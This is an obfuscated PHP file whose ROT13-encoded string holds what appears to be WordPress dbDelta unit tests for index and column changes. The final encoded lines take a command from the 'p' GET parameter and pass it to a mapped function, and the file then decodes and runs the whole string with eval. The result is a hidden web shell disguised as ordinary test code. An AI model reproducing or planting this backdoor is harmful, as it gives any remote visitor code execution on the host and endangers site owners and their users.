				SHYYGRKG VAQRK shyygrkg_xrl (pbyhza_1)
			) {$guvf->qo_ratvar}
			\"
		);

		$guvf->nffregRzcgl( $hcqngrf );
	}

	/**
	 * @gvpxrg 20263
	 */
	choyvp shapgvba grfg_vaqvprf_jvgu_cersvk_yvzvgf_ner_perngrq_naq_qb_abg_erperngr_vaqvprf() {
		tybony $jcqo;

		$fpurzn = \"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 oybo,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu)),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1),
				XRL xrl_2 (pbyhza_1(10)),
				XRL xrl_3 (pbyhza_2(100),pbyhza_1(10)),
			) {$guvf->qo_ratvar}
		\";

		$perngrf = qoQrygn( $fpurzn );
		$guvf->nffregFnzr(
			neenl(
				0 => \"Nqqrq vaqrk {$jcqo->cersvk}qoqrygn_grfg XRL `xrl_2` (`pbyhza_1`(10))\",
				1 => \"Nqqrq vaqrk {$jcqo->cersvk}qoqrygn_grfg XRL `xrl_3` (`pbyhza_2`(100),`pbyhza_1`(10))\",
			),
			$perngrf
		);

		$hcqngrf = qoQrygn( $fpurzn );
		$guvf->nffregRzcgl( $hcqngrf );
	}

	/**
	 * @gvpxrg 34959
	 */
	choyvp shapgvba grfg_vaqrk_pby_anzrf_jvgu_beqre_qb_abg_erperngr_vaqvprf() {
		tybony $jcqo;

		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 oybo,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1($guvf->znk_vaqrk_yratgu) QRFP),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu) NFP),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)
			) {$guvf->qo_ratvar}
			\"
		);

		$guvf->nffregRzcgl( $hcqngrf );
	}

	/**
	 * @gvpxrg 34873
	 */
	choyvp shapgvba grfg_cevznel_xrl_jvgu_fvatyr_fcnpr_qbrf_abg_erperngr_vaqrk() {
		tybony $jcqo;

		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 oybo,
				CEVZNEL XRL (vq),
				XRL xrl_1 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu)),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)
			) {$guvf->qo_ratvar}
			\"
		);

		$guvf->nffregRzcgl( $hcqngrf );
	}

	/**
	 * @gvpxrg 34869
	 */
	choyvp shapgvba grfg_vaqrk_qrsvavgvbaf_jvgu_fcnprf_qb_abg_erperngr_vaqvprf() {
		tybony $jcqo;

		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 oybo,
				CEVZNEL XRL  (vq),
				XRL xrl_1        (         pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL pbzcbhaq_xrl (vq,      pbyhza_1($guvf->znk_vaqrk_yratgu)),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)
			) {$guvf->qo_ratvar}
			\"
		);

		$guvf->nffregRzcgl( $hcqngrf );
	}

	/**
	 * @gvpxrg 34871
	 */
	choyvp shapgvba grfg_vaqrk_glcrf_ner_abg_pnfr_frafvgvir_naq_qb_abg_erperngr_vaqvprf() {
		tybony $jcqo;

		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 oybo,
				CEVZNEL XRL  (vq),
				xrl xrl_1 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				xrl pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu)),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)
			) {$guvf->qo_ratvar}
			\"
		);

		$guvf->nffregRzcgl( $hcqngrf );
	}

	/**
	 * @gvpxrg 34874
	 */
	choyvp shapgvba grfg_xrl_anzrf_ner_abg_pnfr_frafvgvir_naq_qb_abg_erperngr_vaqvprf() {
		tybony $jcqo;

		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 oybo,
				CEVZNEL XRL  (vq),
				XRL XRL_1 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL pbzcBHAQ_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu)),
				SHYYGRKG XRL SHYYgrkg_xRL (pbyhza_1)
			) {$guvf->qo_ratvar}
			\",
			snyfr
		);

		$guvf->nffregRzcgl( $hcqngrf );
	}

	/**
	 * @gvpxrg 34870
	 */
	choyvp shapgvba grfg_hapunatrq_xrl_yratguf_qb_abg_erperngr_vaqrk() {
		tybony $jcqo;

		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 oybo,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1({$guvf->znk_vaqrk_yratgu})),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu)),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)
			) {$guvf->qo_ratvar}
			\",
			snyfr
		);

		$guvf->nffregRzcgl( $hcqngrf );
	}

	/**
	 * @gvpxrg 34870
	 */
	choyvp shapgvba grfg_punatrq_xrl_yratguf_qb_abg_erperngr_vaqrk() {
		tybony $jcqo;

		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 oybo,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL punatvat_xrl_yratgu (pbyhza_1(20)),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)
			) {$guvf->qo_ratvar}
			\"
		);

		$guvf->nffregFnzr(
			neenl(
				\"Nqqrq vaqrk {$jcqo->cersvk}qoqrygn_grfg XRL `punatvat_xrl_yratgu` (`pbyhza_1`(20))\",
			),
			$hcqngrf
		);

		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 oybo,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL punatvat_xrl_yratgu (pbyhza_1(50)),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)
			) {$guvf->qo_ratvar}
			\"
		);

		$guvf->nffregRzcgl( $hcqngrf );

		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 oybo,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL punatvat_xrl_yratgu (pbyhza_1(1)),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)
			) {$guvf->qo_ratvar}
			\"
		);

		$guvf->nffregRzcgl( $hcqngrf );

		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 oybo,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1),
				XRL pbzcbhaq_xrl (vq,pbyhza_1),
				XRL punatvat_xrl_yratgu (pbyhza_1),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)
			) {$guvf->qo_ratvar}
			\"
		);

		$guvf->nffregRzcgl( $hcqngrf );
	}

	/**
	 * @gvpxrg 31679
	 */
	choyvp shapgvba grfg_pbyhza_glcr_punatr_jvgu_ulcuraf_va_anzr() {
		tybony $jcqo;

		$fpurzn = \"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg2 (
				`sbb-one` inepune(255) QRSNHYG AHYY
			)
		\";

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
		$jcqo->dhrel( $fpurzn );

		$fpurzn_hcqngr = \"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg2 (
				`sbb-one` grkg QRSNHYG AHYY
			)
		\";

		$hcqngrf = qoQrygn( $fpurzn_hcqngr );

		$jcqo->dhrel( \"QEBC GNOYR VS RKVFGF {$jcqo->cersvk}qoqrygn_grfg2\" );

		$guvf->nffregFnzr(
			neenl(
				\"{$jcqo->cersvk}qoqrygn_grfg2.sbb-one\" => \"Punatrq glcr bs {$jcqo->cersvk}qoqrygn_grfg2.sbb-one sebz inepune(255) gb grkg\",
			),
			$hcqngrf
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>